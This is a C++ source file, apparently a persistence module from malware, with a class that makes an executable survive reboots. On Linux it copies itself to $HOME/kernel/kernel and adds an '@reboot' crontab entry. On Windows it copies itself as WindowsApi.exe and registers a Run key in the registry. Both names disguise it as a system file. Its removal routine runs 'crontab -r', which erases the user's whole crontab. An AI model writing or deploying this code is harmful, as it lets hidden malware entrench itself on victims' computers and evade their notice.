#include "config.h"
#include "Persistance.h"
#include <stdlib.h>
#include <iostream>
#ifndef LINUX
	#include <windows.h>
#endif
using namespace std;

	void Persistance::persist(const char *execName){
#ifdef LINUX
		string cmd;
		string exe(execName);
		system("mkdir $HOME/kernel");
		cmd="cp "+exe+" $HOME/kernel/kernel";
		system(cmd.c_str());
		cmd="echo @reboot $HOME/kernel/kernel | crontab -";
		system(cmd.c_str());
#else
		// char parsistancePath[1024];
		// strcpy(parsistancePath,getenv("%HOMEPATH%"));
		// strcar(parsistancePath,"\\windows\\windows")
		string homePathString(getenv("HOMEPATH"));
		string homeDir(getenv("HOMEDRIVE"));
		homePathString = homePathString + "\\windows\\WindowsApi.exe";
		string cmd;
		string exe(execName);
		system("mkdir %HOMEPATH%\\windows");
		cmd = "copy " + exe +" "+ homePathString;
		homeDir = homeDir + homePathString;
		cout << homeDir << "aaaa"<<endl;
		system(cmd.c_str());
		std::wstring progPath ;
		progPath.assign(homeDir.begin(), homeDir.end());
		HKEY hkey = NULL;
		LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
		LONG status = RegSetValueExW(hkey, L"WindowsApi", 0, REG_SZ, (BYTE *)progPath.c_str(), (progPath.size()+1) * sizeof(wchar_t));
#endif
	}
	void Persistance::removePersistance(){
#ifdef LINUX
		system("rm -rf $HOME/kernel");
		system("crontab -r");
#else
		system("Del %HOMEPATH%\\windows\\WindowsApi.exe");
#endif
	}
